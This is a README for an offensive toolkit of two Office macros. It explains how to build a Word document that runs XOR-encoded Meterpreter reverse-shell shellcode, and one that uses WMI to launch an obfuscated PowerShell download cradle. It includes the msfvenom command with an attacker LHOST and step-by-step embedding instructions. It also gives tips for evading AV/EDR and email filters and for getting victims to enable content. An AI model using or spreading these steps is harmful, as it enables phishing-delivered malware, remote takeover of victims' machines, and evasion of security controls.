# office-macros

Two files plus documentation. Both macros are **standalone** — pick one based on your target environment. They are not dependent on each other.

---

## File Roles

| File | Standalone? | Technique | Detection level |
|------|-------------|-----------|-----------------|
| `XorShellcodeRunner.vba` | Yes | VBA macro + XOR shellcode | Moderate (shellcode in macro body) |
| `WordPsCradle.vbs` | Yes | WMI + obfuscated PS cradle | Lower (no shellcode in file) |
| `Powershell VBA cradle.md` | — | Notes | Documentation only |

---

## XorShellcodeRunner.vba — Shellcode Directly in the Macro

Runs shellcode directly from a Word/Excel VBA macro using Windows API calls (`VirtualAlloc`, `RtlMoveMemory`, `CreateThread`). Shellcode is XOR-encoded with key `250` (0xfa).

**When to use:** When you want everything self-contained in the Office document — no outbound connections needed to load shellcode.

**Prepare:**
```bash
# 1. Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# 2. XOR encode (key 0xfa) — output as VBA array format
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa xor --format vba

# 3. Paste the VBA byte array into the buf array in XorShellcodeRunner.vba
```

**Embed in Word:**
1. Open Word → Developer tab → Visual Basic (or Alt+F11)
2. Insert → Module
3. Paste the entire contents of `XorShellcodeRunner.vba`
4. Change the `buf` array to your encoded shellcode
5. File → Save As → `.docm` (macro-enabled document)
6. The macro runs automatically when the document opens (if macros enabled)

---

## WordPsCradle.vbs — WMI-Based Download Cradle

Uses WMI `Win32_Process.Create()` to run PowerShell with a base64-encoded download cradle. The PS command string is obfuscated using a rotation cipher — harder for static analysis to flag.

**Why WMI instead of Shell.Run:**
- `Shell.Run()` is heavily monitored by AV/EDR
- WMI process creation is less commonly hooked
- The spawned process appears to come from WMI Service, not Word

**When to use:** When you want the document itself to be clean (no shellcode bytes), and you have a web server to serve the actual payload.

**Customize:**
The download cradle URL is obfuscated inside the `Yellow()` function. To change the URL:
1. Put your desired PowerShell command in a string
2. Run the encoding loop in reverse (add 12 to each char code, format as 3-digit groups)
3. Replace the encoded string in `Yellow()`

Or decode the existing string first, replace the IP, then re-encode it.

**Embed in Word:**
1. Alt+F11 → Insert → Module
2. Paste `WordPsCradle.vbs` contents
3. Save as `.docm`

---

## Notes

- Macros must be enabled by the victim. "Enable Content" prompt appears when opening `.docm` files.
- Modern email filters often block `.docm` attachments — try `.doc` (binary format) or ZIP the file.
- If Defender catches the shellcode in `XorShellcodeRunner.vba`, try the `WordPsCradle.vbs` approach (shellcode is not in the document).
- Start your meterpreter listener before the victim opens the document.
